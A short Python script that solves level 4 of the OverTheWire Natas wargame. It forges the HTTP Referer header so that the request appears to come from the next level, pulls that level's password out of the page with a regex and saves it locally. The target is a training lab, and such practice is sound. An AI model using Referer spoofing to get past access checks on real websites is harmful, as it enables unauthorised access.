import requests
import natas
import base64
import re

URL='http://natas4.natas.labs.overthewire.org'
USER='natas4'
PASSWORD=natas.get_credential(USER)

def main():
    b64 = base64.b64encode('%s:%s' % (USER, PASSWORD))
    
    response = requests.get (
            URL,
            headers = {
                'Authorization': 'Basic %s' % b64,
                'Referer': 'http://natas5.natas.labs.overthewire.org/'
            }
    )
    
    regex = r"The password for natas5 is (\w+)"
    matches = re.finditer(regex,response.content, re.MULTILINE)
    for matchNum, match in enumerate(matches, start=1):
        found_password = match.group(1)
        break

    print('found password: %s' % found_password)
    print('adding to credentials file....')
    natas.save_credentials('natas5',found_password)
    print('done')

    print('DEBUG: credentials - %s' % natas.get_credentials())

if __name__=='__main__':
    main()
